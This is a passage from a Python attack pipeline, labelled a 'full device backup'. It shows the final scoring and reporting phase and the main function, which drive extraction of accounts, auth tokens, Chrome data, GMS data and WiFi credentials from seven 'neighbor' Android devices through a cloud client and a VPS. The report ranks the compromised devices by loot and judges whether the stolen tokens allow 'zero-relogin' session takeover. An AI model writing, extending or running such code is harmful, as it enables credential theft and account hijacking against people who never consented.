    if manifest.get("gms", {}).get("coin_xml"):
        s += 80
    if manifest.get("wifi", {}).get("found"):
        s += 30
    # Penalize empty devices
    if not manifest.get("accounts") and not manifest.get("auth_tokens"):
        s -= 50
    return s

async def phase5_verify_and_report(manifests):
    log("═══ PHASE 5: Device Scoring & Verification Report ═══\n")
    
    scored = []
    for ip, m in manifests.items():
        sc = score_device(m)
        m["score"] = sc
        scored.append((sc, ip, m))
    
    scored.sort(reverse=True)
    
    log("  ╔══════════════════════════════════════════════════════════════════╗")
    log("  ║  FULL DEVICE BACKUP — VERIFICATION REPORT                      ║")
    log("  ╠══════════════════════════════════════════════════════════════════╣")
    
    for rank, (sc, ip, m) in enumerate(scored, 1):
        ident = m.get("identity", {})
        accts = m.get("accounts", [])
        acct_names = [a["name"] for a in accts]
        
        log(f"  ║                                                                  ║")
        log(f"  ║  #{rank} {ip} — {m.get('label','')} — Score: {sc}")
        log(f"  ║  {'ROOT' if m.get('root') else 'SHELL'} | {ident.get('brand','?')} {ident.get('model','?')} ({ident.get('device','?')})")
        log(f"  ║  SDK: {ident.get('sdk','?')} | Patch: {ident.get('security_patch','?')}")
        log(f"  ║  Fingerprint: {ident.get('fingerprint','?')[:70]}")
        log(f"  ║  Accounts ({len(accts)}): {acct_names}")
        log(f"  ║  Auth Tokens: {m.get('auth_tokens', False)}")
        log(f"  ║  Tar Archives: {list(m.get('tar_archives', {}).keys())}")
        log(f"  ║  Chrome Data: {list(m.get('chrome', {}).keys())}")
        log(f"  ║  GMS/COIN: {m.get('gms', {})}")
        log(f"  ║  WiFi: {m.get('wifi', {})}")
        log(f"  ║  Total Packages: {len(m.get('all_packages', []))}")
        
        # Zero-relogin assessment
        zero_relogin = "NO"
        if m.get("auth_tokens") and accts:
            zero_relogin = "YES — has auth tokens + accounts"
        elif accts and any(v > 5000 for v in m.get("tar_archives", {}).values()):
            zero_relogin = "POSSIBLE — has accounts + GMS tar data"
        elif accts:
            zero_relogin = "UNLIKELY — has accounts but no auth tokens"
        
        log(f"  ║  ZERO-RELOGIN: {zero_relogin}")
        log(f"  ║  Raw sizes: {dict(list(m.get('raw_sizes',{}).items())[:5])}...")
    
    log(f"  ║                                                                  ║")
    log(f"  ╚══════════════════════════════════════════════════════════════════╝")
    
    return scored

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════

async def main():
    log("╔════════════════════════════════════════════════════════════╗")
    log("║  FULL DEVICE BACKUP PIPELINE                              ║")
    log("║  Extract EVERYTHING from 7 Neighbor Devices               ║")
    log("║  System + User Apps, Accounts, Tokens, Chrome, GMS, WiFi  ║")
    log("╚════════════════════════════════════════════════════════════╝")
    log(f"  Launchpad: {LAUNCHPAD}")
    log(f"  Targets:   {len(TARGETS)}")
    log(f"  VPS:       {VPS_IP}:{VPS_PORT}")
    log(f"  Backup dir: {LOCAL_BACKUP_DIR}")
    log("")
    
    async with VMOSCloudClient(ak=AK, sk=SK, base_url=BASE) as client:
        # Phase 1: Push packets
        all_cmds = await phase1_push_packets(client)
        
        # Phase 2: Push script  
        await phase2_push_script(client, all_cmds)
        
        # Phase 3: Execute
        await phase3_execute(client, all_cmds)
        
        # Phase 4: Parse
        manifests = await phase4_parse(client, all_cmds)
        
        # Phase 5: Verify & Report
        scored = await phase5_verify_and_report(manifests)
    
    log("")
    log("╔════════════════════════════════════════════════════════════╗")
    log("║  BACKUP COMPLETE — Review report above before restore     ║")
    log("╚════════════════════════════════════════════════════════════╝")

if __name__ == "__main__":
    asyncio.run(main())
